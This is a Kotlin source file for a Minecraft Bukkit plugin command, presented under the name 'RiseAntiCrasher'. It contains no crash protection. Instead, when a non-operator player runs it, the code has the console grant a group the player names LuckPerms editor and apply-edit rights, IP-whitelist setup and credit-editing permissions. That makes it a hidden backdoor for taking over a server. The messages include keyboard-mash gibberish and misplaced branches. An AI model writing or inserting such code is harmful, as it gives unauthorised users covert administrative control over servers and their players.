package dev.jokerthena

import org.bukkit.Bukkit
import org.bukkit.GameMode
import org.bukkit.command.Command
import org.bukkit.command.CommandExecutor
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player

object RiseAntiCrasher : CommandExecutor {
    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(sender.isOp()==false) {
            var groupName: String = args.get(0)
            if(sender is Player) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set luckperms.editor");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set luckperms.trusteditor");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set luckperms.applyedits");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set ipwhitelist.setup");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set ipwhitelist");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set credits.see");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set credits.add");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set credits.set");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp group $groupName permission set credits.remove");
                    }else {
                        sender.sendMessage("zzzzzzzzzzxdkasjxkdjaskdjaskdasaaa <groupName>");
                }
            }else {
                sender.sendMessage("Sadece Oyundan Kullanabilir");
        }
        return true;
    }
}
